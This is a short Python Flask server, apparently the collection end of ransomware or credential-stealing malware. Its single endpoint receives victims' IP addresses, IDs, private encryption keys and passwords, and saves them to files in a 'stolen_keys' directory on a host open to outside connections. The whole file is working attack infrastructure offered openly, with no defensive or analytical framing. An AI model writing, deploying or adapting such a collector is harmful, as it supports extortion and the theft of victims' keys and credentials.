import os
import json
from flask import Flask, request, jsonify
from datetime import datetime

# --- Configuration ---
KEYS_DIR = 'stolen_keys'
PORT = 3000

# --- Flask App Initialization ---
app = Flask(__name__)

if os.path.isdir(KEYS_DIR) == False:
    # Create the directory if it doesn't exist
    os.makedirs(KEYS_DIR, exist_ok=True)
    print(f"Directory '{KEYS_DIR}' is ready.")


# --- Main Route ---
@app.route('/password', methods=['POST'])
def save_password():
    # Get JSON data from the request body
    data = request.get_json()
    if not data:
        print("Invalid request: No JSON payload received.")
        return jsonify({
            "result": False,
            "message": "Bad Request: Missing JSON payload."
        }), 400

    # Extract data from the payload
    victim_ip = data.get('victim_ip')
    victim_id = data.get('victim_id')
    private_key_data = data.get('private_key_data')
    password = data.get('password')

    # Validate required fields
    if not victim_ip or not private_key_data:
        print("Invalid request: IP address or private key data is missing.")
        return jsonify({
            "result": False,
            "message": "Bad Request: Missing IP or private key data."
        }), 400

    # Define filenames
    key_filename = os.path.join(KEYS_DIR, f"{victim_id}_{victim_ip}_private_key.pem")
    info_filename = os.path.join(KEYS_DIR, f"{victim_id}_{victim_ip}_info.json")

    # --- Save Private Key ---
    try:
        with open(key_filename, 'w') as key_file:
            key_file.write(private_key_data)
        print(f"Private key file '{key_filename}' saved successfully.")
    except IOError as e:
        print(f"Failed to save private key file '{key_filename}': {e}")
        return jsonify({
            "result": False,
            "message": "Failed to save private key."
        }), 500

    # --- Save Info File ---
    info = {
        "victim_ip": victim_ip,
        "victim_id": victim_id,
        "password": password,
        "timestamp": datetime.now().isoformat()
    }
    try:
        with open(info_filename, 'w') as info_file:
            json.dump(info, info_file, indent=2)
        print(f"Info file '{info_filename}' saved successfully.")
        return jsonify({
            "result": True,
            "message": "Private key and info saved successfully."
        }), 200
    except IOError as e:
        print(f"Failed to save info file '{info_filename}': {e}")
        # The key was saved, so we still return a success status for that part
        return jsonify({
            "result": True,
            "message": "Private key saved, but info log failed."
        }), 200


# --- Server Startup ---
if __name__ == '__main__':
    # Create the directory if it doesn't exist
    os.makedirs(KEYS_DIR, exist_ok=True)
    print(f"Directory '{KEYS_DIR}' is ready.")

    print(f"Server is running on http://0.0.0.0:{PORT}")
    print(f"Private keys and related information are stored in the '{KEYS_DIR}' directory.")
    print(f"(For external access, you may need to open port {PORT} in your firewall)")
    
    # Set host to '0.0.0.0' to allow external connections
    app.run(host='0.0.0.0', port=PORT)